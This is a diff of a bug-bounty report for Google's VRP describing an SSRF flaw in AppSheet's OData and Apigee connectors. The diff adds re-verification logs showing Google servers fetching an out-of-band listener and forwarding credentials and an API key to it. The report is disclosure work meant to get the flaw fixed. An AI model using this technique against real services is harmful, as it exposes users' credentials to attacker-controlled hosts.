@@ -49,9 +49,11 @@ At least four independent instances of the same root cause are now documented:
 | 4 | **Apigee API connector, OpenAPI Spec URL code path** | distinct HTTP client (not OData) | **Confirmed open — this report, Surface 2** |
 
 Items 3 and 4 were confirmed in the same testing session on 2026-06-16, using the same
-OOB listener, from two distinct GCP fleet IPs. Each fetches a different path, uses a
-different HTTP client, and forwards different credential types — demonstrating independent
-implementations with the same unfixed root cause.
+OOB listener, from two distinct GCP fleet IPs. Both surfaces were independently
+re-verified on 2026-06-17 with a fresh OOB listener, confirming the vulnerability
+remains open. Each fetches a different path, uses a different HTTP client, and forwards
+different credential types — demonstrating independent implementations with the same
+unfixed root cause.
 
 ---
 
@@ -145,12 +147,43 @@ X-Apikey: Ahsisjsshsgyssuwhehdidieuwwysu
 
 Both surfaces were triggered sequentially in a single session using the same OOB listener.
 
+### Re-verification — 2026-06-17 (independent fresh confirmation)
+
+Both surfaces were re-confirmed live with a fresh OOB listener (`d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`):
+
+**Surface 1 — OData re-verification (2026-06-17 12:52:14 UTC):**
+```http
+GET /$metadata HTTP/1.1
+Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
+Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
+Accept-Encoding: gzip, deflate
+Authorization: Basic VGVzdGVyOlRlc3Rlcg==
+Traceparent: 00-23103155bc2d083d8cf868a01076f20f-036bb2c7acf998da-00
+```
+- Source IP: `34.82.138.241` (GCP)
+- `VGVzdGVyOlRlc3Rlcg==` decodes to `Tester:Tester` — credentials forwarded verbatim
+- Error reflected AppSheet content-type `text/html; charset=utf-8` in MIME-type error message
+
+**Surface 2 — Apigee re-verification (2026-06-17 12:53:59 UTC):**
+```http
+GET / HTTP/1.1
+Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
+Accept-Encoding: gzip, deflate
+Cache-Control: no-cache
+Traceparent: 00-8bde2532872f8eb05b453ce8be84355b-7f88857fce367bc5-00
+X-Apikey: vrp-canary-apikey-2026
+```
+- Source IP: `35.233.152.59` (GCP — same fleet node as original 2026-06-16 test)
+- `X-Apikey: vrp-canary-apikey-2026` — API key entered in form forwarded verbatim
+- UI error reflected: `'<html><head></head><body>kz6jnphhd9sdn0b7j3sd0c8r96qo89p8d</body></html>' is not supported`
+
 ### Additional OData evidence from prior sessions
 
-The OData connector SSRF has been confirmed independently on three separate dates:
+The OData connector SSRF has been confirmed independently on four separate dates:
 - 2026-06-15 20:03 UTC — GCP IP `35.203.182.241`, creds `testuser:testpass1234`
 - 2026-06-16 11:43 UTC — GCP IP `35.247.115.29` (independent re-verification, different session)
-- 2026-06-16 20:56 UTC — GCP IP `35.203.182.241`, creds `canary:canary` (this session)
+- 2026-06-16 20:56 UTC — GCP IP `35.203.182.241`, creds `canary:canary`
+- **2026-06-17 12:52 UTC — GCP IP `34.82.138.241`, creds `Tester:Tester` (pre-submission re-verification)**
 
 ---
 
@@ -310,14 +343,17 @@ a different bug class (CWE-502), not SSRF — noted as context only.
 ---
 
 *Reporter: zahinshahriar3@gmail.com*
-*Report date: 2026-06-16*
+*Report date: 2026-06-17 (original discovery 2026-06-16; re-verified 2026-06-17 pre-submission)*
 *Submit at: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`)*
 
 ---
 <!-- Internal: do not submit this comment block -->
 - F003 = consolidated systemic report; supersedes F002 as primary submission
 - F002 retained as standalone OData-only fallback
-- Surface 1 OOB: `d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro`, GCP IP `35.203.182.241`, 2026-06-16 20:56:44 UTC
-- Surface 2 OOB: same listener, GCP IP `35.233.152.59`, 2026-06-16 20:59:14 UTC
+- Original Surface 1 OOB: `d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro`, GCP IP `35.203.182.241`, 2026-06-16 20:56:44 UTC
+- Original Surface 2 OOB: same listener, GCP IP `35.233.152.59`, 2026-06-16 20:59:14 UTC
+- Re-verify Surface 1 OOB: `d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`, GCP IP `34.82.138.241`, 2026-06-17 12:52:14 UTC
+- Re-verify Surface 2 OOB: same listener, GCP IP `35.233.152.59`, 2026-06-17 12:53:59 UTC
 - Evidence log: `results/appsheet.com/runbooks/egress-test-log.md`
 - Raw OOB log: `results/appsheet.com/evidence/session3-20260616/oob_L1_20260616.log`
+- Re-verify evidence: `results/appsheet.com/evidence/verify-20260617/VERIFICATION-SUMMARY.md`
